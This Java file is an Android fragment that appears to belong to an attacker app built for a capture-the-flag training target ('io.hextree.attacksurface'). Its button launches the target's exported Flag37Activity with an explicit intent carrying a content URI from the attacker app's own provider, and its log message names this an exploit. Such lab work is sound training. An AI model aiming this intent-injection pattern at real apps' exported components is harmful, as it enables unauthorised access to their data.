package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class Flag37Fragment extends Fragment {
    private static final String TAG = "Flag37Fragment";

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag37, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag37);
        
        launchButton.setOnClickListener(v -> {
            try {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface", 
                        "io.hextree.attacksurface.activities.Flag37Activity"));
                Uri uri = Uri.parse("content://com.appdev.intentattacks.provider/flag37");
                intent.setData(uri);
                startActivity(intent);
                Toast.makeText(getContext(), "Activity started. Check logs for flag.", Toast.LENGTH_LONG).show();
            } catch (Exception e) {
                Log.e(TAG, "Error launching Flag37 exploit: " + e.getMessage());
                Toast.makeText(getContext(), "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
            }
        });

        return view;
    }
} 